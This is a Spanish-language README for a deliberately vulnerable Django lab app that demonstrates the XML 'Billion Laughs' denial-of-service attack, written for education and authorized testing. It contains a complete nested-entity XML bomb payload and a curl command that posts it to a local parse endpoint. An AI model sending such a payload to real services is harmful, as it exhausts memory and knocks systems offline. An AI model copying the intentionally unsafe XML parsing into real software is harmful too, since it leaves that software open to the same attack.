# BillionLaugh - Proyecto de Ejemplo Vulnerable a Ataques XML Billion Laughs

Este proyecto es una aplicación web deliberadamente vulnerable desarrollada en Django para demostrar cómo funciona el ataque conocido como "Billion Laughs" o "XML Bomb". Está diseñado únicamente con fines educativos y para pruebas de seguridad en entornos controlados.

## ⚠️ Advertencia
Este software contiene código intencionalmente vulnerable. No debe desplegarse en ambientes de producción ni en sistemas accesibles públicamente. Su uso está destinado únicamente a laboratorios de pruebas de penetración autorizadas o entornos de aprendizaje seguro.

## 🧪 ¿Qué es el ataque Billion Laughs?
El ataque "Billion Laughs" es un tipo de ataque de denegación de servicio (DoS) contra analizadores XML que explota la expansión de entidades definidas recursivamente para generar una cantidad masiva de datos en memoria, agotando los recursos del sistema.

## 🛠️ Tecnologías utilizadas
- Python 3.x
- Django 4.x
- `xml.etree.ElementTree` (vulnerable por defecto)

## 🚀 Cómo ejecutar el proyecto
1. Clona este repositorio:

    ```bash
    git clone https://github.com/wh01s17/billionlaugh_vuln.git
    cd billionlaugh_vuln
    ```

2. Crea un entorno virtual e instala Django:

    ```bash
    python -m venv venv
    source venv/bin/activate   # En Windows usa `venv\Scripts\activate`
    pip install django lxml
    ```

3. Ejecuta las migraciones iniciales:

    ```bash 
    python manage.py migrate
    ```

4. Inicia el servidor:
    ```bash
    python manage.py runserver
    ```

5. Accede a la vista vulnerable:
    ```bash
    http://127.0.0.1:8000/api/parse/
    ```

🧪 Probar la vulnerabilidad
Envía una solicitud POST a /api/parse/ con un payload como el siguiente:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">
    <!ENTITY lol11 "&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;">
]>
<lolz>&lol11;</lolz>
```

Puedes usar herramientas como curl:
```bash
curl -X POST http://127.0.0.1:8000/api/parse/ -H "Content-Type: application/xml" --data-binary @payload.xml
```

Observa cómo el consumo de memoria crece exponencialmente al procesarse.
